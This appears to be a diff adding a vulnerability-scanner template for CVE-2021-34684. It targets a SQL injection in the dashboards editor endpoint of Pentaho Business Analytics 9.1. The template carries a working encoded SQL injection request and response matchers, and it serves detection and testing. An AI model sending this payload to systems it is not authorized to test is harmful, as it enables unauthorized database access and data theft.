@@ -1,0 +1,28 @@
+id: cve-2021-34684
+info:
+  name: Pentaho Business Analytics 9.1 SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Pentaho Business Analytics is a business analysis platform that enables you to safely access, integrate, operate, visualize and analyze big data assets. There is a SQL injection vulnerability in the query parameter of the `/pentaho/api/repos/dashboards/editor` path. Attackers can exploit this vulnerability to execute arbitrary SQL statements without authorization, obtain sensitive information, and potentially take over the system.
+  classification:
+    cvss-score: 9.8
+    cve-id: CVE-2021-34684
+  tags: sqli
+  reference:
+    - https://packetstormsecurity.com/files/164791/Pentaho-Business-Analytics-Pentaho-Business-Server-9.1-SQL-Injection.html
+http:
+  - raw:
+      - |
+        GET /pentaho/api/repos/dashboards/editor?command=executeQuery&datasource=pentaho_operations_mart&query=(SELECT%20CONCAT(CONCAT((CHR(113)%7C%7CCHR(120)%7C%7CCHR(118)%7C%7CCHR(112)%7C%7CCHR(113)),(CASE%20WHEN%20(4452=4452)%20THEN%20CHR(49)%20ELSE%20CHR(48)%20END)),(CHR(113)%7C%7CCHR(122)%7C%7CCHR(98)%7C%7CCHR(107)%7C%7CCHR(113))))&require-cfg.js HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "qxvpq1qzbkq"
+        part: body
+      - type: word
+        words:
+          - "MetaData"
+        part: body
